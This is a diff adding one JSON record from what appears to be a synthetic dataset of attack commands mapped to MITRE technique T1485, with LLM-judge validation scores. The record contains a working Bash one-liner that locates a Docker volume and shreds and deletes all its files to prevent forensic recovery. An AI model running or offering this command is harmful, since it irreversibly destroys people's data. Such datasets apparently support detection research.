@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "find \"$(docker volume inspect -f '{{.Mountpoint}}' app_data)\" -xdev -type f -exec shred -n 2 -z -u -f {} +",
+  "explanation": "Locates the mount point of the Docker volume 'app_data' and irreversibly destroys files within it.",
+  "rationale_steps": [
+    "Leverage Docker to resolve the exact volume mount path for targeted destruction.",
+    "Overwrite data within the volume to prevent forensic recovery of container data.",
+    "Delete files after shredding to purge directory entries inside the volume."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-097d0d83-6d4af726",
+  "source_prompt_hash": "097d0d83",
+  "timestamp_utc": "2025-09-30T07:53:07.976516Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid find and shred flags, and correct -exec {} + usage.",
+        "semantic_score": 3,
+        "semantic_justification": "It targets the Docker volume mountpoint and uses shred to overwrite and delete files consistent with data destruction, but an unprivileged user typically lacks Docker daemon access and write permissions to the volume path, reducing practical feasibility.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:51:23.536446Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is mostly well-formed with balanced quotes and valid flags, but using `find` with a command-substitution argument as the search path may cause issues if the mount point path contains spaces, and the `+` terminator for `-exec shred` is non-standard since shred doesn't accept multiple file arguments the way some tools do (though it does accept multiple files).",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly uses `docker volume inspect` to resolve the mount point, then applies `shred -n 2 -z -u -f` to securely overwrite and delete files within the Docker volume, which is a textbook T1485 data destruction technique targeting containerized application data.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-19T01:42:04.113554Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses perfectly formed Bash syntax, including correct command substitution, Go templating for Docker, and standard find/shred flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately identifies the host path for a Docker volume and uses the shred utility to securely and irreversibly destroy the data, aligning perfectly with T1485.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:42:07.802694Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
